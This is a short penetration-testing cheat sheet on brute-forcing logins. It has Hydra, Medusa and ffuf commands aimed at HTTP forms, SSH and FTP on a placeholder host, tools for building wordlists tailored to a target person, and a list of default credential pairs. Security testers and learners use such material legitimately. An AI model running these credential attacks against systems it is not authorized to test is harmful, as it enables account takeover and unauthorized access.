# Login Brute Forcing

Automated credential testing against login forms, SSH, FTP, and other services using wordlists.

## Hydra

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt target.com http-get /admin/

# SSH
hydra -l root -P rockyou.txt ssh://target.com -t 4

# FTP
hydra -l admin -P rockyou.txt ftp://target.com

# Multiple usernames
hydra -L users.txt -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:error"

# Custom port
hydra -l admin -P rockyou.txt -s 8080 target.com http-post-form "/login:u=^USER^&p=^PASS^:fail"
```

## Medusa

```bash
medusa -h target.com -u admin -P rockyou.txt -M http -m DIR:/login.php -m FORM:user=^USER^&pass=^PASS^ -m DENY:"Invalid"
```

## Ffuf for Web Login

```bash
ffuf -u http://target.com/login -X POST \
  -d "user=admin&pass=FUZZ" \
  -w rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302 -fs 1234
```

## Custom Wordlists

```bash
# Username generation from name
cupp -i               # interactive
username-anarchy -i first last

# Password mutation
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt

# CUPP target-specific
cupp -i   # answers questions about target → custom wordlist
```

## Default Credentials

```bash
# Common defaults
admin:admin
admin:password
admin:1234
root:root
admin:(blank)

# Search default creds DB
https://cirt.net/passwords
https://default-password.info
```
